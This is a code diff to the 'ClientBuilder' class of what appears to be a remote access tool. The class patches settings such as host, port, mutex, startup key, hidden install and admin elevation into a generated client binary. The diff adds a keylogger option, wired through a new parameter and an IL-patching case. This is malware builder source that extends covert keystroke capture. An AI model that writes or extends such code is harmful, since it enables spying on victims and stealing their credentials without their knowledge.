@@ -10,7 +10,8 @@ namespace xServer.Core.Build
     public static class ClientBuilder
     {
         public static void Build(string output, string host, string password, string installsub, string installname,
-            string mutex, string startupkey, bool install, bool startup, bool hidefile, int port, int reconnectdelay,
+            string mutex, string startupkey, bool install, bool startup, bool hidefile, bool keylogger, int port,
+            int reconnectdelay,
             int installpath, bool adminelevation, string iconpath, string[] asminfo, string version)
         {
             // PHASE 1 - Settings
@@ -85,6 +86,9 @@ namespace xServer.Core.Build
                                         case 4: //AdminElevation
                                             methodDef.Body.Instructions[i] =
                                                 Instruction.Create(BoolOpcode(adminelevation));
+                                            break;
+                                        case 5: //Keylogger
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(keylogger));
                                             break;
                                     }
                                     bools++;
